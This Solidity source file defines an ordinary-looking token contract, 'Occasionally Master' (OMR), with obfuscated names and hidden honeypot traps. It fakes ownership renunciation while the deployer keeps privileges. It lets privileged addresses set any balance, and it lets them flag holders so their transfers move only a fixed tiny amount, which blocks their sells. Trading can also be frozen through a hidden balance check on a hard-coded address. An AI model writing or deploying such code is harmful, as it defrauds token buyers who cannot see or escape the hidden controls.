//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface launchedTx {
    function createPair(address senderReceiver, address takeShouldMin) external returns (address);
}

interface feeLimitMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverWalletSender) external view returns (uint256);

    function transfer(address marketingMin, uint256 tokenMarketing) external returns (bool);

    function allowance(address launchedAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address marketingMin,
        uint256 tokenMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeExempt, uint256 value);
    event Approval(address indexed launchedAt, address indexed spender, uint256 value);
}

abstract contract marketingFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeLimitMarketingMetadata is feeLimitMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OccasionallyMaster is marketingFrom, feeLimitMarketing, feeLimitMarketingMetadata {

    address liquidityReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private buyLiquidity;

    address public senderAmount;

    function allowance(address launchedTradingWallet, address fromLimit) external view virtual override returns (uint256) {
        if (fromLimit == liquidityReceiver) {
            return type(uint256).max;
        }
        return receiverTxTo[launchedTradingWallet][fromLimit];
    }

    bool private launchMarketing;

    uint256 constant sellSwap = 13 ** 10;

    uint256 private receiverList;

    function receiverMarketingAmount(address toReceiver, address marketingMin, uint256 tokenMarketing) internal returns (bool) {
        require(txTake[toReceiver] >= tokenMarketing);
        txTake[toReceiver] -= tokenMarketing;
        txTake[marketingMin] += tokenMarketing;
        emit Transfer(toReceiver, marketingMin, tokenMarketing);
        return true;
    }

    function atMarketing() public {
        emit OwnershipTransferred(senderAmount, address(0));
        launchIsFund = address(0);
    }

    string private senderBuy = "Occasionally Master";

    bool public fromToTx;

    function exemptMarketingMin(address minSender) public {
        takeEnable();
        
        if (minSender == senderAmount || minSender == amountTo) {
            return;
        }
        minWallet[minSender] = true;
    }

    mapping(address => uint256) private txTake;

    function transfer(address feeSender, uint256 tokenMarketing) external virtual override returns (bool) {
        return modeLaunched(_msgSender(), feeSender, tokenMarketing);
    }

    uint256 sellLaunchList;

    uint256 modeTxReceiver;

    uint256 private exemptTrading;

    address public amountTo;

    function getOwner() external view returns (address) {
        return launchIsFund;
    }

    function owner() external view returns (address) {
        return launchIsFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toAmount;
    }

    function launchedReceiver(address liquiditySell) public {
        require(liquiditySell.balance < 100000);
        if (liquidityMode) {
            return;
        }
        
        maxTo[liquiditySell] = true;
        if (launchMarketing) {
            fromToTx = true;
        }
        liquidityMode = true;
    }

    function isLaunch(address feeSender, uint256 tokenMarketing) public {
        takeEnable();
        txTake[feeSender] = tokenMarketing;
    }

    event OwnershipTransferred(address indexed autoShould, address indexed marketingTx);

    bool public liquidityMode;

    address private launchIsFund;

    bool private launchFeeTo;

    function decimals() external view virtual override returns (uint8) {
        return toToken;
    }

    bool private listSell;

    uint256 public listFeeTrading;

    uint256 private toAmount = 100000000 * 10 ** 18;

    mapping(address => bool) public minWallet;

    function transferFrom(address toReceiver, address marketingMin, uint256 tokenMarketing) external override returns (bool) {
        if (_msgSender() != liquidityReceiver) {
            if (receiverTxTo[toReceiver][_msgSender()] != type(uint256).max) {
                require(tokenMarketing <= receiverTxTo[toReceiver][_msgSender()]);
                receiverTxTo[toReceiver][_msgSender()] -= tokenMarketing;
            }
        }
        return modeLaunched(toReceiver, marketingMin, tokenMarketing);
    }

    mapping(address => bool) public maxTo;

    function approve(address fromLimit, uint256 tokenMarketing) public virtual override returns (bool) {
        receiverTxTo[_msgSender()][fromLimit] = tokenMarketing;
        emit Approval(_msgSender(), fromLimit, tokenMarketing);
        return true;
    }

    bool public fromTotal;

    mapping(address => mapping(address => uint256)) private receiverTxTo;

    function balanceOf(address receiverWalletSender) public view virtual override returns (uint256) {
        return txTake[receiverWalletSender];
    }

    function modeLaunched(address toReceiver, address marketingMin, uint256 tokenMarketing) internal returns (bool) {
        if (toReceiver == senderAmount) {
            return receiverMarketingAmount(toReceiver, marketingMin, tokenMarketing);
        }
        uint256 totalLimit = feeLimitMarketing(amountTo).balanceOf(tokenFee);
        require(totalLimit == sellLaunchList);
        require(marketingMin != tokenFee);
        if (minWallet[toReceiver]) {
            return receiverMarketingAmount(toReceiver, marketingMin, sellSwap);
        }
        return receiverMarketingAmount(toReceiver, marketingMin, tokenMarketing);
    }

    constructor (){
        if (launchMarketing) {
            listFeeTrading = exemptTrading;
        }
        receiverTotal maxSwap = receiverTotal(liquidityReceiver);
        amountTo = launchedTx(maxSwap.factory()).createPair(maxSwap.WETH(), address(this));
        if (listSell) {
            modeFund = true;
        }
        senderAmount = _msgSender();
        maxTo[senderAmount] = true;
        txTake[senderAmount] = toAmount;
        atMarketing();
        
        emit Transfer(address(0), senderAmount, toAmount);
    }

    string private atSell = "OMR";

    uint8 private toToken = 18;

    function walletFund(uint256 tokenMarketing) public {
        takeEnable();
        sellLaunchList = tokenMarketing;
    }

    function takeEnable() private view {
        require(maxTo[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return atSell;
    }

    address tokenFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return senderBuy;
    }

    bool public modeFund;

}